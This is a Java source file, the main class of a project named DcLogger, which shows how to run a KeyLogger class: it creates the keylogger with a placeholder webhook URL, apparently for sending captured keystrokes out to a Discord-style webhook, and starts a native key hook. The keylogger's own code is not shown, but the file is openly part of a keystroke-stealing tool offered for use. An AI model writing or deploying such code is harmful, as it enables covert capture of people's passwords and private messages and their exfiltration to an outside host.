package me.lyzev.dclogger;

import java.net.MalformedURLException;

/**
 * This file is part of DcLogger.
 * Copyright (c) 2021 Lyzev.
 *
 * @author Lyzev
 * @date 3/11/2022
 * @project DcLogger
 * @package me.lyzev.dclogger
 */
public class DcLogger {

    /**
     * This is an example on how to use {@link KeyLogger}.
     *
     * @throws MalformedURLException the exception is going to be thrown if the url is incorrect
     */
    public static void main(String[] args) throws MalformedURLException {
        KeyLogger logger = new KeyLogger("WEBHOOK-URL"); // Declares and initializes the keylogger
        logger.start(); // Registers the NativeLogger (If it isn't registered the event will not be called, so nothing would be logged)
    }

}
